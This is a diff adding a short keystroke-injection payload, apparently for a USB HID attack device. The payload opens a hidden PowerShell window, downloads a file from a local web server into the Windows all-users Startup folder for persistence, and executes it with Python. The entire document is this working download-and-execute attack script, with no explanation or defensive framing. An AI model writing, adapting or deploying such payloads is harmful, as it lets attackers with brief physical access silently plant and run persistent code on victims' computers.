@@ -1,0 +1,10 @@
+GUI r
+DELAY 500
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1000
+STRING wget "http://127.0.0.1:5000/" -outfile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\test.py";
+ENTER
+DELAY 500
+STRING python "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\test.py"
+ENTER
